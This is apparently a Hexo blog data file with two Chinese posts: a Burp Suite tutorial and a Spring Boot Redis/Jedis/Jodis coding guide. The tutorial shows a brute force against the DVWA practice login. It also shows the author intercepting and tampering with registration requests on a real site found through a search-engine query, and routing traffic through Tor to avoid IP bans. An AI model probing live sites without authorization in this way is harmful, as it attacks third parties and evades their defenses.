title=\"2.一个爆破小例子\"></a>2.一个爆破小例子</h5><p>来dvwn的登录（admin/password）<br><img src=\"../../images/security/burpsuite/dvwn_login_1.png\" alt=\"intruder_01\"><br>随便输入，抓取数据包，send to intruder<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_01.png\" alt=\"intruder_02\"><br>选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br><br>然后，clear清空变量，鼠标选中后，add添加自己需要的变量<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_02.png\" alt=\"intruder_03\"><br>分别添加变量对应的字典，进行爆破<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_03.png\" alt=\"intruder_04\"><br>爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_04.png\" alt=\"intruder_05\"></p>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>1.使用burpsuite抓包后，vpn没用了，不能访问外网<br></p>\n<p>解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br></p>\n<p>2018/12/20 添加:<br><br>解决2，使用代理链 <a href=\"https://www.anquanke.com/post/id/85925\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/85925</a><br><br>同理，也可以使用代理链来用tor进行代理(防封ip)<br><img src=\"../../images/security/burpsuite/proxy_chain_01.png\" alt=\"proxy_chain_01\"><br>不稳定，容易出错：SOCKS server general failure<br><br>原因待查。。。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-配置\"><a href=\"#1-配置\" class=\"headerlink\" title=\"1.配置\"></a>1.配置</h4><p>先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br><br>  <img src=\"../../images/security/burpsuite/chrome_proxy.png\" alt=\"proxy_1\"></p>\n<p>  <img src=\"../../images/security/burpsuite/chrome_proxy2.png\" alt=\"proxy_1_1\"></p>\n<p>再配置burpsuite监听这个端口的流量<br><br>  <img src=\"../../images/security/burpsuite/burpsuite_proxy.png\" alt=\"proxy_2\"></p>\n<p>此外 ，因为要访问https,配置完这些后，打开浏览器访问<a href=\"http://burp，下载证书，安装到受信任颁发机构\" target=\"_blank\" rel=\"noopener\">http://burp，下载证书，安装到受信任颁发机构</a><br><br><img src=\"../../images/security/burpsuite/burpsuite_ca_certificate.png\" alt=\"proxy_3\"><br><img src=\"../../images/security/burpsuite/ca_certificate_install.png\" alt=\"proxy_3_1\"></p>\n<h4 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h4><h5 id=\"1-第一个抓包小例子\"><a href=\"#1-第一个抓包小例子\" class=\"headerlink\" title=\"1.第一个抓包小例子\"></a>1.第一个抓包小例子</h5><p>1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个<a href=\"http://usr.005.tv/User/login.html\" target=\"_blank\" rel=\"noopener\">http://usr.005.tv/User/login.html</a><br><img src=\"../../images/security/burpsuite/usr005tv_login_page1.png\" alt=\"login_page_1\"><br>先点击注册<br><img src=\"../../images/security/burpsuite/usr005tv_register1.png\" alt=\"register_page_1\"></p>\n<p><br><br><strong>其中我们邮箱和手机号都是填的假号码。<br>然后开始拦截抓包，滑动滑块</strong></p>\n<p><img src=\"../../images/security/burpsuite/usr005tv_package_1.png\" alt=\"package1\"><br>修改号码为自己手机号，收到验证码<br><img src=\"../../images/security/burpsuite/usr005tv_package_2.png\" alt=\"package1\"><br>输入验证码<br><img src=\"../../images/security/burpsuite/usr005tv_package_3.png\" alt=\"package1\"><br>在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。</p>\n<h5 id=\"2-一个爆破小例子\"><a href=\"#2-一个爆破小例子\" class=\"headerlink\" title=\"2.一个爆破小例子\"></a>2.一个爆破小例子</h5><p>来dvwn的登录（admin/password）<br><img src=\"../../images/security/burpsuite/dvwn_login_1.png\" alt=\"intruder_01\"><br>随便输入，抓取数据包，send to intruder<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_01.png\" alt=\"intruder_02\"><br>选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br><br>然后，clear清空变量，鼠标选中后，add添加自己需要的变量<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_02.png\" alt=\"intruder_03\"><br>分别添加变量对应的字典，进行爆破<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_03.png\" alt=\"intruder_04\"><br>爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)<br><img src=\"../../images/security/burpsuite/burpsuite_intruder_04.png\" alt=\"intruder_05\"></p>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>1.使用burpsuite抓包后，vpn没用了，不能访问外网<br></p>\n<p>解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br></p>\n<p>2018/12/20 添加:<br><br>解决2，使用代理链 <a href=\"https://www.anquanke.com/post/id/85925\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/85925</a><br><br>同理，也可以使用代理链来用tor进行代理(防封ip)<br><img src=\"../../images/security/burpsuite/proxy_chain_01.png\" alt=\"proxy_chain_01\"><br>不稳定，容易出错：SOCKS server general failure<br><br>原因待查。。。</p>\n"},{"title":"springboot-redis","date":"2018-09-17T03:14:52.000Z","_content":"\n#### 1.redis大概\n1.Redis\n```\n<dependency>  \n\t<groupId>org.springframework.data</groupId>  \n\t<artifactId>spring-data-redis</artifactId>  \n\t<version>1.8.9.RELEASE</version>  \n</dependency>\n```\n通过org.springframework.data.redis.connection.jedis.JedisConnectionFactory工厂类来管理，然后通过配置的模版bean，操作redis服务，代码段中充斥大量与业务无关的模版片段代码，代码冗余 <br/>\nspring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api<br/>\n<!-- more -->\n配置类\n```\npackage com.example.redisdemo.redis;\n\nimport org.springframework.cache.CacheManager;\nimport org.springframework.cache.annotation.CachingConfigurerSupport;\nimport org.springframework.cache.annotation.EnableCaching;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.cache.RedisCacheManager;\nimport org.springframework.data.redis.connection.RedisConnectionFactory;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.RedisSerializer;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\n\n@EnableCaching\n@Configuration\npublic class RedisConfig extends CachingConfigurerSupport {\n\n    @Bean\n    public CacheManager cacheManager (RedisTemplate  redisTemplate){\n        CacheManager cacheManager = new RedisCacheManager(redisTemplate);\n        return cacheManager;\n    }\n\n    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api\n//    @Bean\n    public RedisTemplate redisTemplate(RedisConnectionFactory factory){\n        RedisTemplate<String,Object> redisTemplate = new RedisTemplate<>();\n        //设置序列化方式,不设置value\n        RedisSerializer redisSerializer =new StringRedisSerializer();\n        redisTemplate.setKeySerializer(redisSerializer);\n        redisTemplate.setHashKeySerializer(redisSerializer);\n        //连接\n        redisTemplate.setConnectionFactory(factory);\n        return redisTemplate;\n    }\n}\n```\n\n使用\n```\npackage com.example.redisdemo.redis;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.core.ValueOperations;\nimport org.springframework.stereotype.Service;\n\n//@Service\npublic class RedisServer {\n    @Autowired\n    RedisTemplate redisTemplate;\n\n    public  void setKey(String key, Object value){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        vo.set(key, value);\n        //设置过期时间\n        redisTemplate.expire(key,600,TimeUnit.SECONDS);\n\n    }\n\n    public  Object getKey(String key){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        return vo.get(key);\n    }\n\n}\n\n```\n\n2.Jedis\n```\n<dependency>\n\t<groupId>redis.clients</groupId>\n\t<artifactId>jedis</artifactId>\n\t<version>2.7.3</version>\n</dependency>\n<!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients -->\n<!--<dependency>-->\n    <!--<groupId>org.springframework.boot</groupId>-->\n    <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n<!--</dependency>-->\n```\n\n通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码\n<br/>\n\n配置类\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JedisConfig {\n\n    @Bean\n    public JedisPool getJedisPool(){\n        JedisPoolConfig config = new JedisPoolConfig();\n        //连接设置\n        //config.setMaxTotal(Integer.parseInt(maxTotal));\n        //config.set（等等）\n        //建立连接\n        JedisPool jedisPool = new JedisPool(config, \"127.0.0.1\", 6379);\n        return jedisPool;\n    }\n\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.List;\n\n@Service\npublic class JedisServer {\n    @Autowired\n    JedisPool jedisPool;\n\n    public  void setKey(String key, Object value){\n        //try/catch后面添加\n        Jedis jedis = jedisPool.getResource();\n         //set(String, String) 所以List需要序列化,此处value为list\n        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n        //设置过期时间\n        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisPool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n3.Jodis\n```\n        <dependency>\n            <groupId>redis.clients</groupId>\n            <artifactId>jedis</artifactId>\n            <version>2.7.3</version>\n        </dependency>\n        <dependency>\n            <groupId>com.wandoulabs.jodis</groupId>\n            <artifactId>jodis</artifactId>\n            <version>0.2.2</version>\n        </dependency>\n```\n\n与codis结合使用对jedispool做了封装。<br/>\n通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br/>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br/>\n\n配置类\n```\npackage com.example.redisdemo.jodis;\n\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport com.wandoulabs.jodis.RoundRobinJedisPool;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JodisConfig {\n    @Value(\"${spring.jodis.zkPath}\")\n    private String zkPath;\n    @Value(\"${spring.jodis.product}\")\n    private String product;\n    @Value(\"${spring.jodis.zkPassword}\")\n    private String zkPassword;\n    @Value(\"${spring.jodis.zkTimeout}\")\n    private int zkTimeout;\n    @Value(\"${spring.jodis.maxTotal}\")\n    private String maxTotal;\n    @Value(\"${spring.jodis.maxWaitMillis}\")\n    private String maxWaitMillis;\n    @Value(\"${spring.jodis.poolMinIdle}\")\n    private int poolMinIdele;\n    @Value(\"${spring.jodis.poolMaxIdle}\")\n    private int poolMaxIdle;\n    @Value(\"${spring.jodis.testOnBorrow}\")\n    private boolean testOnBorrow;\n    @Value(\"${spring.jodis.testOnReturn}\")\n    private boolean testOnReturn;\n\n    @Bean\n    public JedisResourcePool zkJedisPool(){\n        JedisResourcePool jedisPool = null;\n\n        try {\n            JedisPoolConfig config = new JedisPoolConfig();\n            config.setMaxTotal(Integer.parseInt(maxTotal));\n            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));\n            config.setMaxIdle(poolMaxIdle);\n            config.setMinIdle(poolMinIdele);\n            config.setTestOnBorrow(testOnBorrow);\n            config.setTestOnReturn(testOnReturn);\n            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)\n                    .zkProxyDir(product).password(zkPassword)\n                    .poolConfig(config).build();\n        }catch (Exception e){\n            System.out.println(\"jodis 连接出错。\");\n        }\n        return jedisPool;\n    }\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jodis;\n\nimport com.example.redisdemo.jedis.ObjectTranscoder;\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\n\nimport java.util.List;\n\n@Service\npublic class JodisServer {\n\n    @Autowired\n    JedisResourcePool jedisResourcePool;\n\n    public void setKey(String key, Object value, int time){\n        Jedis jedis = jedisResourcePool.getResource();\n        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));\n    }\n    public void setKey(String key, Object value){\n        Jedis jedis = jedisResourcePool.getResource();\n        System.out.println(\"ttl: \");\n        System.out.println(jedis.ttl(key));\n        //long转int,向下转换，可能溢出，不能直接转换，所以long -> String -> int\n        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));\n        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisResourcePool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n\n#### 2.一些注意事项\n1.存储数据\n在jedis存储数据过程中\n```\npublic String set(String key, String value) {\n  this.checkIsInMultiOrPipeline();\n  this.client.set(key, value);\n  return this.client.getStatusCodeReply();\n}\n```\n类型为String,String 所以我们要存储List数据，需要先进行序列化<br/>\nSerialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br/>\n\n```\n//存\npublic  void setKey(String key, Object value){\n  Jedis jedis = jedisPool.getResource();\n  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n}\n//取\npublic Object getKey(String key){\n    Jedis jedis = jedisPool.getResource();\n    if(jedis == null || !jedis.exists(key.getBytes())){\n        return null;\n    }\n    byte[] in = jedis.get(key.getBytes());\n    List list = (List) ObjectTranscoder.deserialize(in);\n    return list;\n}\n```\n序列化工具类\n```\npackage com.example.redisdemo.jedis;\n\nimport java.io.*;\n\n//序列化工具类\npublic class ObjectTranscoder {\n    public static byte[] serialize(Object value) {\n        if (value == null) {\n            throw new NullPointerException(\"Can't serialize null\");\n        }\n        byte[] rv=null;\n        ByteArrayOutputStream bos = null;\n        ObjectOutputStream os = null;\n        try {\n            bos = new ByteArrayOutputStream();\n            os = new ObjectOutputStream(bos);\n            os.writeObject(value);\n            os.close();\n            bos.close();\n            rv = bos.toByteArray();\n        } catch (IOException e) {\n            throw new IllegalArgumentException(\"Non-serializable object\", e);\n        } finally {\n            try {\n                if(os!=null)os.close();\n                if(bos!=null)bos.close();\n            }catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n\n    public static Object deserialize(byte[] in) {\n        Object rv=null;\n        ByteArrayInputStream bis = null;\n        ObjectInputStream is = null;\n        try {\n            if(in != null) {\n                bis=new ByteArrayInputStream(in);\n                is=new ObjectInputStream(bis);\n                rv=is.readObject();\n                is.close();\n                bis.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                if(is!=null)is.close();\n                if(bis!=null)bis.close();\n            } catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n}\n```\n\n2.maven包冲突\n```\n      <!-- redis -->\n       <!--<dependency>-->\n           <!--<groupId>org.springframework.boot</groupId>-->\n           <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n       <!--</dependency>-->\n       <dependency>\n           <groupId>redis.clients</groupId>\n           <artifactId>jedis</artifactId>\n           <version>2.7.3</version>\n       </dependency>\n       <dependency>\n           <groupId>com.wandoulabs.jodis</groupId>\n           <artifactId>jodis</artifactId>\n           <version>0.2.2</version>\n       </dependency>\n```\n\nspringboot自己集成的spring-boot-data-redis与redis-clients有冲突<br/>\nredis-clients可以与jodis配合使用，所以选择redis-clients.\n\n3.关于redis过期时间\nredis默认不过期，当内存满时，删除先存入的\n```\n//存短信记录,首次，设置过期时间\n   public void setJodisWithTime(String key, Object value, int time){\n       Jedis jedis = jedisResourcePool.getResource();\n       //set(String, String) 所以List需要序列化，有效时间为time\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n   //存短信记录，不重新设置过期时间,使用原有的\n   public void setJodis(String key, Object value){\n       Jedis jedis = jedisResourcePool.getResource();\n       //使用原有时间\n       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n```\n","source":"_posts/java/springboot-redis.md","raw":"---\ntitle: springboot-redis\ndate: 2018-09-17 11:14:52\ntags: [springboot]\n---\n\n#### 1.redis大概\n1.Redis\n```\n<dependency>  \n\t<groupId>org.springframework.data</groupId>  \n\t<artifactId>spring-data-redis</artifactId>  \n\t<version>1.8.9.RELEASE</version>  \n</dependency>\n```\n通过org.springframework.data.redis.connection.jedis.JedisConnectionFactory工厂类来管理，然后通过配置的模版bean，操作redis服务，代码段中充斥大量与业务无关的模版片段代码，代码冗余 <br/>\nspring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api<br/>\n<!-- more -->\n配置类\n```\npackage com.example.redisdemo.redis;\n\nimport org.springframework.cache.CacheManager;\nimport org.springframework.cache.annotation.CachingConfigurerSupport;\nimport org.springframework.cache.annotation.EnableCaching;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.cache.RedisCacheManager;\nimport org.springframework.data.redis.connection.RedisConnectionFactory;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.RedisSerializer;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\n\n@EnableCaching\n@Configuration\npublic class RedisConfig extends CachingConfigurerSupport {\n\n    @Bean\n    public CacheManager cacheManager (RedisTemplate  redisTemplate){\n        CacheManager cacheManager = new RedisCacheManager(redisTemplate);\n        return cacheManager;\n    }\n\n    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api\n//    @Bean\n    public RedisTemplate redisTemplate(RedisConnectionFactory factory){\n        RedisTemplate<String,Object> redisTemplate = new RedisTemplate<>();\n        //设置序列化方式,不设置value\n        RedisSerializer redisSerializer =new StringRedisSerializer();\n        redisTemplate.setKeySerializer(redisSerializer);\n        redisTemplate.setHashKeySerializer(redisSerializer);\n        //连接\n        redisTemplate.setConnectionFactory(factory);\n        return redisTemplate;\n    }\n}\n```\n\n使用\n```\npackage com.example.redisdemo.redis;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.core.ValueOperations;\nimport org.springframework.stereotype.Service;\n\n//@Service\npublic class RedisServer {\n    @Autowired\n    RedisTemplate redisTemplate;\n\n    public  void setKey(String key, Object value){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        vo.set(key, value);\n        //设置过期时间\n        redisTemplate.expire(key,600,TimeUnit.SECONDS);\n\n    }\n\n    public  Object getKey(String key){\n        ValueOperations<String,Object> vo = redisTemplate.opsForValue();\n        return vo.get(key);\n    }\n\n}\n\n```\n\n2.Jedis\n```\n<dependency>\n\t<groupId>redis.clients</groupId>\n\t<artifactId>jedis</artifactId>\n\t<version>2.7.3</version>\n</dependency>\n<!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients -->\n<!--<dependency>-->\n    <!--<groupId>org.springframework.boot</groupId>-->\n    <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n<!--</dependency>-->\n```\n\n通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码\n<br/>\n\n配置类\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JedisConfig {\n\n    @Bean\n    public JedisPool getJedisPool(){\n        JedisPoolConfig config = new JedisPoolConfig();\n        //连接设置\n        //config.setMaxTotal(Integer.parseInt(maxTotal));\n        //config.set（等等）\n        //建立连接\n        JedisPool jedisPool = new JedisPool(config, \"127.0.0.1\", 6379);\n        return jedisPool;\n    }\n\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.List;\n\n@Service\npublic class JedisServer {\n    @Autowired\n    JedisPool jedisPool;\n\n    public  void setKey(String key, Object value){\n        //try/catch后面添加\n        Jedis jedis = jedisPool.getResource();\n         //set(String, String) 所以List需要序列化,此处value为list\n        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n        //设置过期时间\n        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisPool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n3.Jodis\n```\n        <dependency>\n            <groupId>redis.clients</groupId>\n            <artifactId>jedis</artifactId>\n            <version>2.7.3</version>\n        </dependency>\n        <dependency>\n            <groupId>com.wandoulabs.jodis</groupId>\n            <artifactId>jodis</artifactId>\n            <version>0.2.2</version>\n        </dependency>\n```\n\n与codis结合使用对jedispool做了封装。<br/>\n通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br/>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br/>\n\n配置类\n```\npackage com.example.redisdemo.jodis;\n\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport com.wandoulabs.jodis.RoundRobinJedisPool;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JodisConfig {\n    @Value(\"${spring.jodis.zkPath}\")\n    private String zkPath;\n    @Value(\"${spring.jodis.product}\")\n    private String product;\n    @Value(\"${spring.jodis.zkPassword}\")\n    private String zkPassword;\n    @Value(\"${spring.jodis.zkTimeout}\")\n    private int zkTimeout;\n    @Value(\"${spring.jodis.maxTotal}\")\n    private String maxTotal;\n    @Value(\"${spring.jodis.maxWaitMillis}\")\n    private String maxWaitMillis;\n    @Value(\"${spring.jodis.poolMinIdle}\")\n    private int poolMinIdele;\n    @Value(\"${spring.jodis.poolMaxIdle}\")\n    private int poolMaxIdle;\n    @Value(\"${spring.jodis.testOnBorrow}\")\n    private boolean testOnBorrow;\n    @Value(\"${spring.jodis.testOnReturn}\")\n    private boolean testOnReturn;\n\n    @Bean\n    public JedisResourcePool zkJedisPool(){\n        JedisResourcePool jedisPool = null;\n\n        try {\n            JedisPoolConfig config = new JedisPoolConfig();\n            config.setMaxTotal(Integer.parseInt(maxTotal));\n            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));\n            config.setMaxIdle(poolMaxIdle);\n            config.setMinIdle(poolMinIdele);\n            config.setTestOnBorrow(testOnBorrow);\n            config.setTestOnReturn(testOnReturn);\n            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)\n                    .zkProxyDir(product).password(zkPassword)\n                    .poolConfig(config).build();\n        }catch (Exception e){\n            System.out.println(\"jodis 连接出错。\");\n        }\n        return jedisPool;\n    }\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jodis;\n\nimport com.example.redisdemo.jedis.ObjectTranscoder;\nimport com.wandoulabs.jodis.JedisResourcePool;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\n\nimport java.util.List;\n\n@Service\npublic class JodisServer {\n\n    @Autowired\n    JedisResourcePool jedisResourcePool;\n\n    public void setKey(String key, Object value, int time){\n        Jedis jedis = jedisResourcePool.getResource();\n        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));\n    }\n    public void setKey(String key, Object value){\n        Jedis jedis = jedisResourcePool.getResource();\n        System.out.println(\"ttl: \");\n        System.out.println(jedis.ttl(key));\n        //long转int,向下转换，可能溢出，不能直接转换，所以long -> String -> int\n        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));\n        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisResourcePool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n\n#### 2.一些注意事项\n1.存储数据\n在jedis存储数据过程中\n```\npublic String set(String key, String value) {\n  this.checkIsInMultiOrPipeline();\n  this.client.set(key, value);\n  return this.client.getStatusCodeReply();\n}\n```\n类型为String,String 所以我们要存储List数据，需要先进行序列化<br/>\nSerialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br/>\n\n```\n//存\npublic  void setKey(String key, Object value){\n  Jedis jedis = jedisPool.getResource();\n  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n}\n//取\npublic Object getKey(String key){\n    Jedis jedis = jedisPool.getResource();\n    if(jedis == null || !jedis.exists(key.getBytes())){\n        return null;\n    }\n    byte[] in = jedis.get(key.getBytes());\n    List list = (List) ObjectTranscoder.deserialize(in);\n    return list;\n}\n```\n序列化工具类\n```\npackage com.example.redisdemo.jedis;\n\nimport java.io.*;\n\n//序列化工具类\npublic class ObjectTranscoder {\n    public static byte[] serialize(Object value) {\n        if (value == null) {\n            throw new NullPointerException(\"Can't serialize null\");\n        }\n        byte[] rv=null;\n        ByteArrayOutputStream bos = null;\n        ObjectOutputStream os = null;\n        try {\n            bos = new ByteArrayOutputStream();\n            os = new ObjectOutputStream(bos);\n            os.writeObject(value);\n            os.close();\n            bos.close();\n            rv = bos.toByteArray();\n        } catch (IOException e) {\n            throw new IllegalArgumentException(\"Non-serializable object\", e);\n        } finally {\n            try {\n                if(os!=null)os.close();\n                if(bos!=null)bos.close();\n            }catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n\n    public static Object deserialize(byte[] in) {\n        Object rv=null;\n        ByteArrayInputStream bis = null;\n        ObjectInputStream is = null;\n        try {\n            if(in != null) {\n                bis=new ByteArrayInputStream(in);\n                is=new ObjectInputStream(bis);\n                rv=is.readObject();\n                is.close();\n                bis.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                if(is!=null)is.close();\n                if(bis!=null)bis.close();\n            } catch (Exception e2) {\n                e2.printStackTrace();\n            }\n        }\n        return rv;\n    }\n}\n```\n\n2.maven包冲突\n```\n      <!-- redis -->\n       <!--<dependency>-->\n           <!--<groupId>org.springframework.boot</groupId>-->\n           <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n       <!--</dependency>-->\n       <dependency>\n           <groupId>redis.clients</groupId>\n           <artifactId>jedis</artifactId>\n           <version>2.7.3</version>\n       </dependency>\n       <dependency>\n           <groupId>com.wandoulabs.jodis</groupId>\n           <artifactId>jodis</artifactId>\n           <version>0.2.2</version>\n       </dependency>\n```\n\nspringboot自己集成的spring-boot-data-redis与redis-clients有冲突<br/>\nredis-clients可以与jodis配合使用，所以选择redis-clients.\n\n3.关于redis过期时间\nredis默认不过期，当内存满时，删除先存入的\n```\n//存短信记录,首次，设置过期时间\n   public void setJodisWithTime(String key, Object value, int time){\n       Jedis jedis = jedisResourcePool.getResource();\n       //set(String, String) 所以List需要序列化，有效时间为time\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n   //存短信记录，不重新设置过期时间,使用原有的\n   public void setJodis(String key, Object value){\n       Jedis jedis = jedisResourcePool.getResource();\n       //使用原有时间\n       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));\n       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));\n   }\n```\n","slug":"java/springboot-redis","published":1,"updated":"2019-01-21T09:07:52.244Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64053100226cvpa6lyn9tp","content":"<h4 id=\"1-redis大概\"><a href=\"#1-redis大概\" class=\"headerlink\" 